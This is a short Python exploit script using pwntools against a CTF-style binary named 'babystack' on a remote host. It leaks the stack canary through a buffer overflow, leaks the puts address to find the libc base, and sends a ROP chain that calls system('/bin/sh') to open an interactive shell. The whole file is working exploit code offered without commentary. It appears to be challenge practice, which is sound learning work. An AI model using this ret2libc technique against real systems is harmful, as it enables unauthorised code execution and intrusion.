from pwn import *

elf = ELF("./babystack")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p = process("./babystack")
p = remote("111.198.29.45",41800)
libc = ELF("./libc-2.23.so")

pop_rdi_ret = 0x0000000000400a93
p.recvuntil(">> ")

p.sendline("1")
sleep(1)
p.sendline("a"*0x88)
p.recvuntil(">> ")
p.sendline("2")
p.recvuntil("\n")
x = p.recvline()[0:7]
x = u64(x.rjust(8,"\x00"))
print (hex(x))
p.recvuntil(">> ")
p.sendline("1")
sleep(1)
p.sendline("a"*0x88+p64(x)+p64(0x400908)+p64(pop_rdi_ret)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(0x400908))
sleep(1)
p.recvuntil(">> ")
p.sendline("3")
putsaddr = p.recvline()[0:6]
putsaddr = u64(putsaddr.ljust(8,"\x00"))
libcbase = putsaddr - libc.symbols["puts"]
systemaddr = libcbase + libc.symbols["system"]
binshaddr = libcbase + next(libc.search("/bin/sh"))
print "system:"+hex(systemaddr) 

p.recvuntil(">> ")
p.sendline("1")
sleep(1)
#gdb.attach(p, "b * 0x400a2a")
p.sendline("a"*0x88+p64(x)+p64(0x400908)+p64(pop_rdi_ret)+p64(binshaddr)+p64(systemaddr))
p.recvuntil(">> ")
p.sendline("3")


p.interactive()
